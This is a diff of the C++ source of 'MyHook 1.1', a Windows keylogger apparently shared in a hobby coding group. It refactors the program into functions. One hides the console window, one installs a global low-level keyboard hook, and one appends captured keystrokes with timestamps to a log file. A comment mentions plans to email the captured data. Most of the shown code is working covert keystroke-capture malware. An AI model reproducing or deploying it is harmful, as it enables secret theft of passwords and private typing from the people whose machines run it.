@@ -1,6 +1,6 @@
 /*
     MyHook 1.1
-    Copyright 2008 Daniel Amodio (deige101)
+    Origional Code and Concept Copyright 2008 Daniel Amodio (deige101)
     Created for Major League Coding
     http://groups.myspace.com/MajorLeagueCoding
 
@@ -21,64 +21,46 @@
 /*
     TENATIVE UPDATES
 
-    *add support for more keystrokes
     *add support for command line paramaters that let the app react different
         could optionaly email data, or could run in debug mode, etc
     *add abstract class for different ways to catch data.
+    
+    CHANGELOG
+    Removed <iostream> and <string> header files
+    Removed namespace std library
+    Changed outputlog formating
+    Cleaned up main by making 3 new functions:
+         Hiding
+         Starting a new log
+         Hooking Keyboard
+    
+    
 */
 
 #include <windows.h>
 #include <stdio.h>
 #include <tchar.h>
-#include <iostream>
 #include <time.h>
-#include <string>
 
-using namespace std;
 
 // Declare callback function
 LRESULT CALLBACK LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam );
 
-// Declare function to catch data and do whatever with it
-void fcatch(char* data)
-{
-    FILE *file;
-    file=fopen("log.txt","a+");
-    fputs(data,file);
-    fclose(file);
-}
+//NEW - Declare fcatch function
+void fcatch(char* data);
+
+//NEW - Declare hiding function
+void hideMe(void);
+//NEW - Declare logging function
+void startLog(void);
+//
+void hookIt(void);
 
 int main()
 {
-    // Hide the program
-    HWND stealth;
-    AllocConsole();
-    stealth=FindWindowA("ConsoleWindowClass",NULL);
-    ShowWindow(stealth,0);
-
-    // Get current time
-    time_t ltime;
-    ltime=time(NULL);
-
-    // Add new session to log
-    fcatch("\n\n------------------------------------------------------------------------");
-    fcatch("\n\t\t\t\t\t\t\t\tMyHook Session\t");
-    fcatch(asctime(localtime(&ltime))); // Add timestamp to log file
-    fcatch("------------------------------------------------------------------------\n");
-
-    // Retrieve the applications instance
-    HINSTANCE appInstance = GetModuleHandle(NULL);
-
-    // Set a global Windows Hook to capture keystrokes.
-    SetWindowsHookEx( WH_KEYBOARD_LL, LowLevelKeyboardProc, appInstance, 0 );
-
-    MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0) > 0)
-    {
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
-    }
-
+    hideMe();
+    startLog();
+    hookIt();
     return 0;
 }
 
@@ -308,4 +290,52 @@ LRESULT CALLBACK LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam )
     }
 
     return 0;
+}
+// Declare function to catch data and do whatever with it
+void fcatch(char* data)
+{
+    FILE *file;
+    file=fopen("log.txt","a+");
+    fputs(data,file);
+    fclose(file);
+}
+
+// NEW - Hide function. Removed AllocConsole()
+void hideMe(void)
+{
+
+     HWND stealth;
+     stealth=FindWindowA("ConsoleWindowClass",NULL);
+     ShowWindow(stealth,0);
+}
+
+// NEW - New log function. Added the get current time call into function
+         
+void startLog(void)
+{
+     time_t ltime;
+     ltime=time(NULL);
+    fcatch("\n\n------------------------------------------------------------------------");
+    fcatch("\n\t\t\tMyHook Session\t");
+    fcatch(asctime(localtime(&ltime))); // Add timestamp to log file
+    fcatch("------------------------------------------------------------------------\n");
+}   
+
+
+// NEW 
+void hookIt(void)
+{
+     // Retrieve the applications instance
+    HINSTANCE appInstance = GetModuleHandle(NULL);
+
+    // Set a global Windows Hook to capture keystrokes.
+    SetWindowsHookEx( WH_KEYBOARD_LL, LowLevelKeyboardProc, appInstance, 0 );
+
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0) > 0)
+    {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+
 }
